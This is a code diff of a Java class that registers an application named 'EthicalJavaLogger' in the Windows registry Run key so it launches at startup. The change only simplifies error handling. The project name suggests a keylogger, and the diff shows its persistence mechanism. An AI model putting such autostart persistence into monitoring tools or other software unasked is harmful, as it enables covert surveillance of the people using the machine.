@@ -10,22 +10,16 @@ import java.util.logging.Logger;
 public class AutoStartController {
     
     public void configureAutoStart() {
-        try {
-            String registryKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EthicalJavaLogger";
-            String jarPath = EthicalJavaLogger.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
-            System.out.println(jarPath);
-            System.out.println(new File(jarPath).getAbsolutePath());
-            
-            AutoStartService autoStartService = new AutoStartService(registryKey, new File(jarPath).getAbsolutePath());
-            
-            if (!autoStartService.verificarRegistro()) {
-                autoStartService.registrarParaIniciarComWindows();
-                System.out.println("Registrado para iniciar com o Windows.");
-            } else {
-                System.out.println("Já registrado para iniciar com o Windows.");
-            }
-        } catch (URISyntaxException ex) {
-            Logger.getLogger(AutoStartController.class.getName()).log(Level.SEVERE, null, ex);
+        String registryKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EthicalJavaLogger";
+        String jarPath = EthicalJavaLogger.class.getProtectionDomain().getCodeSource().getLocation().getPath();
+        System.out.println(jarPath);
+        System.out.println(new File(jarPath).getAbsolutePath());
+        AutoStartService autoStartService = new AutoStartService(registryKey, new File(jarPath).getAbsolutePath());
+        if (!autoStartService.verificarRegistro()) {
+            autoStartService.registrarParaIniciarComWindows();
+            System.out.println("Registrado para iniciar com o Windows.");
+        } else {
+            System.out.println("Já registrado para iniciar com o Windows.");
         }
     }
     
